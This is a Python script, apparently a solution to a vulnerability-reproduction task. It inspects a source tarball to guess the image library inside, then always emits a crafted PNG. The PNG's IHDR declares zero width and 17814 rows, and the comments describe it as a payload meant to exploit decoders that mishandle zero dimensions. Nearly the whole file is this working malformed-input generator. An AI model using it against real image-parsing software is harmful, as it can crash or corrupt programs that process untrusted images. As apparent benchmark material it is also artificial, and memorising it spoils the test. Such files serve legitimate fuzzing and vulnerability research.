import os
import tarfile
import io
import zlib
import binascii
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to detect format; default to PNG
        fmt = self._detect_format(src_path)
        if fmt != "png":
            # Fallback to PNG regardless; PNG crafted to exploit zero width/height
            pass
        return self._make_png_zero_width(height=17814)

    def _detect_format(self, src_path: str) -> str:
        # Heuristically detect project to choose format; default to png
        detected = {"png": 0, "gif": 0, "webp": 0, "tiff": 0, "qoi": 0, "jpeg": 0}
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    # Signals from filenames
                    if any(x in name_lower for x in ("png", "spng", "lodepng")):
                        detected["png"] += 2
                    if any(x in name_lower for x in ("gif", "giflib")):
                        detected["gif"] += 1
                    if "webp" in name_lower:
                        detected["webp"] += 1
                    if "tiff" in name_lower or "libtiff" in name_lower:
                        detected["tiff"] += 1
                    if "qoi" in name_lower:
                        detected["qoi"] += 1
                    if any(x in name_lower for x in ("jpeg", "jpg", "libjpeg", "turbojpeg", "openjpeg")):
                        detected["jpeg"] += 1

                    # Read small files to inspect contents
                    if m.size > 1024 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    try:
                        text = data.decode("utf-8", errors="ignore").lower()
                    except Exception:
                        text = ""

                    if ("#include <png.h>" in text) or ("png_create_read_struct" in text) or ("ihdr" in text and "idat" in text):
                        detected["png"] += 3
                    if ("spng.h" in text) or ("libspng" in text):
                        detected["png"] += 2
                    if ("lodepng" in text):
                        detected["png"] += 2
                    if ("gif_lib.h" in text) or ("dgif" in text) or ("giffiletype" in text):
                        detected["gif"] += 2
                    if ("<webp/" in text) or ("webpdecode" in text) or ("webp" in text and "decode" in text):
                        detected["webp"] += 2
                    if ("<tiffio.h>" in text) or ("tiffopen" in text) or ("libtiff" in text):
                        detected["tiff"] += 2
                    if ("qoi.h" in text) or ("qoiformat" in text) or ("qoif" in text):
                        detected["qoi"] += 2
                    if ("jpeglib.h" in text) or ("libjpeg" in text) or ("turbojpeg" in text) or ("openjpeg" in text):
                        detected["jpeg"] += 2
        except Exception:
            pass

        # Choose the most likely
        best_fmt = "png"
        best_score = -1
        for k, v in detected.items():
            if v > best_score:
                best_fmt = k
                best_score = v

        # Prefer png on ties due to our crafted payload
        if best_fmt not in ("png",):
            return "png"
        return best_fmt

    def _crc32(self, data: bytes) -> int:
        return binascii.crc32(data) & 0xffffffff

    def _png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack(">I", len(data))
        crc = struct.pack(">I", self._crc32(chunk_type + data))
        return length + chunk_type + data + crc

    def _make_png_zero_width(self, height: int) -> bytes:
        # PNG signature
        signature = b"\x89PNG\r\n\x1a\n"

        # IHDR with width=0, height=height, bit depth=8, color type=6 (RGBA), compression=0, filter=0, interlace=0
        width = 0
        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
        ihdr_chunk = self._png_chunk(b"IHDR", ihdr_data)

        # IDAT data: zlib-compressed stream of 'height' filter bytes (all 0 = filter type 'None')
        raw = b"\x00" * height
        compressed = zlib.compress(raw, 9)
        idat_chunk = self._png_chunk(b"IDAT", compressed)

        # IEND chunk
        iend_chunk = self._png_chunk(b"IEND", b"")

        return signature + ihdr_chunk + idat_chunk + iend_chunk
